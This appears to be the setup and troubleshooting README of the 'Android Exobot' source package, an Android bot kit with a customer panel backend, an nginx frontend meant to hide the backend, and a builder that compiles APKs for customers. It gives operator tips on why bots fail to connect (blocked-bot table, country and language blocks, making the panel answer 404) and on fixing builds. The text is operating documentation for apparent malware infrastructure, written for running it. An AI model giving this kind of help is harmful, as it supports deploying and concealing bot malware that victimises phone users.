
Android Exobot (app, panels and ecosystem) sources v. 2.0 

backend_server/SETUP.txt -- backend - powerful server to provide customers bot panels, admin panel, compiled apks
frontend_server/SETUP.txt -- frontend - lightweight server to hide backend with nginx proxy
builder_server/SETUP.txt -- builder - powerful server to manage customers, bot templates, build apks and automatically upload them to backend


TROUBLESHOOTING:

- if bot does not connect, check db table 'blocked_bots' on backend in database 'general'

By default bot blocked by this rules:  see backed/www/base/bot/bot_api.php 'is_bot_blocked' function
and build_server/www/app/app/src/main/java/com/moonny/constants/S.java 'blocked_countries', 'blocked_langs'

- if bot does not connect, check access permissions to bot panel.

https://domain/panel2/ should show "404 not found", not "403 forbidden"!

- if Builder does not build with error: 
	PermissionError: [Errno 13] Permission denied: '/var/data/www/app/app/src/main/java/com/moonny/constants/S.java'
	
	1. go to /var/data/www/app, do './gradlew aR' to make sure if gradle/SDK is configured correct and it builds release-app.apk
	2. rm -rf build/* ; rm -rf app/build/*
	3. chown -R www-data:www-data .    - in the same directory
